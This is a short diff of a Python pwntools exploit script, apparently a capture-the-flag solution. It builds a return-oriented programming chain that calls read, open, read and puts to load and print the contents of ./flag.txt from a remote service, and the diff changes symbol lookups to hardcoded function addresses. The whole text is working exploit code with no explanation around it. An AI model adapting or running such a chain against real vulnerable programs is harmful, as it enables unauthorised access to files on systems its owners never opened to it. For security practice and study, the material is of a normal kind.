@@ -24,24 +24,25 @@ payload += p64(pop_rdi_ret)
 payload += p64(0)
 payload += p64(pop_rsi_ret)
 payload += buf_addr
-payload += p64(elf.sym.read)
+payload += p64(0x00401170)
 #open ./flag.txt
 payload += p64(pop_rdi_ret)
 payload += buf_addr
 payload += p64(pop_rsi_ret)
 payload += p64(0)
-payload += p64(elf.sym.open)
+payload += p64(0x004011c0)
 #read flag into stack
 payload += p64(pop_rdi_ret)
 payload += p64(3)
 payload += p64(pop_rsi_ret)
 payload += buf_addr
-payload += p64(elf.sym.read)
+payload += p64(0x00401170)
 #puts the flag
 payload += p64(pop_rdi_ret)
 payload += buf_addr
-payload += p64(elf.sym.puts)
+payload += p64(0x00401120)
 
 io.sendlineafter('tell us a wish for next year:', payload)
+io.sendline('./flag.txt')
 print io.recvall()
 
